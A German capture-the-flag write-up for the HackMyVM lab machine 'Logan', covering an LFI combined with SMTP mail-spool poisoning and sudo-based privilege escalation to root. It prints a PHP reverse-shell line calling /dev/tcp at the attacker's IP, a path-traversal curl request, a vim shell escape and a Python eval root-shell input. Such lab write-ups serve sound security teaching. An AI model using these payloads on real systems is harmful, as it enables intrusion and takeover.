# Logan - HackMyVM (Medium)

![Logan.png](Logan.png)

## Übersicht

*   **VM:** Logan
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Logan)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 19. Juli 2023
*   **Original-Writeup:** https://alientec1908.github.io/Logan_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Logan" zu erlangen. Der initiale Zugriff erfolgte durch Ausnutzung einer Local File Inclusion (LFI)-Schwachstelle in einer PHP-Anwendung auf einer Admin-Subdomain. Diese LFI wurde genutzt, um durch SMTP Log Poisoning eine PHP-Reverse-Shell in die Mailbox-Datei des Benutzers `www-data` zu schreiben und diese dann über die LFI auszuführen. Dies führte zu einer Shell als `www-data`. Die erste Rechteausweitung zum Benutzer `logan` gelang durch Missbrauch einer `sudo`-Regel, die `www-data` erlaubte, `vim` als `logan` auszuführen. Die finale Eskalation zu Root erfolgte durch Ausnutzung einer weiteren unsicheren `sudo`-Regel, die `logan` erlaubte, ein Python-Skript als `root` auszuführen, welches wiederum anfällig für Code-Injection via `eval()` war.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `vi` / `nano`
*   `nmap`
*   `nikto`
*   `gobuster`
*   `dirb`
*   `wfuzz`
*   `nc` (netcat)
*   `telnet`
*   `msfconsole` (Metasploit Framework)
*   `sqlmap`
*   `curl`
*   Python3
*   `sudo`
*   Standard Linux-Befehle (`ls`, `cat`, `id`, `cd`, `find`, `apt`, `vim`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Logan" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.123) mit `arp-scan` identifiziert.
    *   `/etc/hosts`-Eintrag für `logan.hmv` hinzugefügt.
    *   `nmap`-Scan offenbarte Port 25 (SMTP, Postfix) und Port 80 (HTTP, Apache 2.4.52). Der VRFY-Befehl auf SMTP war aktiviert.
    *   `nikto` und `gobuster`/`dirb` auf `http://logan.hmv/` zeigten keine direkten Schwachstellen oder interessanten PHP-Dateien.

2.  **Subdomain Enumeration & LFI Discovery:**
    *   Mittels `wfuzz` wurde die Subdomain `admin.logan.hmv` entdeckt.
    *   `/etc/hosts`-Eintrag für `admin.logan.hmv` hinzugefügt.
    *   Manuelle Untersuchung und `gobuster` auf `http://admin.logan.hmv/` fanden u.a. `upload.php`, `payments.php` und `clearlogs.php`.
    *   Analyse von `payments.php` (akzeptiert POST-Parameter `file`) deutete auf eine Local File Inclusion (LFI)-Schwachstelle hin.

3.  **Initial Access (SMTP Log Poisoning & LFI -> RCE als `www-data`):**
    *   User Enumeration via SMTP (`VRFY` mit `nc` oder `smtp_enum` in Metasploit) bestätigte die Existenz der Benutzer `root` und `www-data`.
    *   Eine PHP-Reverse-Shell (`exec("bash -c 'bash -i >& /dev/tcp/ANGRIFFS_IP/443 0>&1'");`) wurde per E-Mail (SMTP, Port 25) an `www-data@logan.hmv` gesendet.
    *   Ein Netcat-Listener wurde auf dem Angreifer-System auf Port 443 gestartet.
    *   Die LFI-Schwachstelle in `payments.php` wurde genutzt, um die Mailbox-Datei von `www-data` zu inkludieren: `curl http://admin.logan.hmv/payments.php -d 'file=....//....//....//....//....//....//var/mail/www-data'`.
    *   Dies führte zur Ausführung des PHP-Payloads und etablierte eine Reverse Shell als Benutzer `www-data`.

4.  **Privilege Escalation (von `www-data` zu `logan` via `sudo vim`):**
    *   Als `www-data` wurde das Home-Verzeichnis von `logan` (`/home/logan/`) untersucht (war weltbeschreibbar). Die User-Flag (`User: ilovelogs`) wurde in `/home/logan/user.txt` gefunden.
    *   `sudo -l` als `www-data` zeigte, dass der Befehl `/usr/bin/vim` als Benutzer `logan` ohne Passwort ausgeführt werden durfte: `(logan) NPASSWD: /usr/bin/vim`.
    *   Durch Ausführen von `sudo -u logan /usr/bin/vim -c ':!/bin/sh'` wurde eine Shell als Benutzer `logan` erlangt.

5.  **Privilege Escalation (von `logan` zu `root` via `sudo python eval`):**
    *   Im Home-Verzeichnis von `logan` wurde eine `to-do`-Datei gefunden mit dem Hinweis auf ein "script that gave me root".
    *   `sudo -l` als `logan` zeigte, dass der Befehl `/usr/bin/python3 /opt/learn_some_python.py` als `root` ohne Passwort ausgeführt werden durfte: `(root) NPASSWD: /usr/bin/python3 /opt/learn_some_python.py`.
    *   Das Skript `/opt/learn_some_python.py` wurde mit `sudo` gestartet. Es stellte sich als interaktive Lernumgebung heraus.
    *   Durch Eingabe von `eval('__import__("os").system("/bin/bash -p")')` in die Eingabeaufforderung des Skripts konnte eine Bash-Shell mit Root-Rechten (`euid=0(root)`) gestartet werden.
    *   Die Root-Flag (`Root: siuuuuuuuu`) wurde in `/root/root.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Local File Inclusion (LFI):** Eine Schwachstelle in `payments.php` erlaubte das Inkludieren beliebiger lokaler Dateien durch Manipulation des `file`-Parameters.
*   **SMTP Log Poisoning:** Die LFI wurde genutzt, um eine Mailbox-Datei (`/var/mail/www-data`) zu inkludieren, in die zuvor ein PHP-Payload per SMTP geschrieben wurde, was zu RCE führte.
*   **SMTP User Enumeration (VRFY):** Der aktivierte `VRFY`-Befehl im Postfix-Server erlaubte das Bestätigen gültiger Benutzernamen.
*   **Unsichere `sudo`-Regeln:**
    *   `www-data` durfte `vim` als `logan` ausführen (`(logan) NPASSWD: /usr/bin/vim`), was eine Eskalation zu `logan` ermöglichte.
    *   `logan` durfte ein Python-Skript als `root` ausführen (`(root) NPASSWD: /usr/bin/python3 /opt/learn_some_python.py`).
*   **Unsichere Code-Ausführung (Python `eval`):** Das Python-Skript, das mit `sudo`-Rechten ausgeführt werden konnte, verwendete `eval()` (oder eine ähnliche unsichere Funktion) zur Verarbeitung von Benutzereingaben, was Code-Injection und somit Root-Eskalation ermöglichte.
*   **Unsichere Dateiberechtigungen:** Das Home-Verzeichnis von `logan` war weltbeschreibbar.

## Flags

*   **User Flag (`/home/logan/user.txt`):** `User: ilovelogs`
*   **Root Flag (`/root/root.txt`):** `Root: siuuuuuuuu`

## Tags

`HackMyVM`, `Logan`, `Medium`, `LFI`, `SMTP Log Poisoning`, `sudo Exploit`, `vim Exploit`, `Python eval Injection`, `Subdomain Enumeration`, `Linux`, `Web`, `Privilege Escalation`, `Apache`, `Postfix`
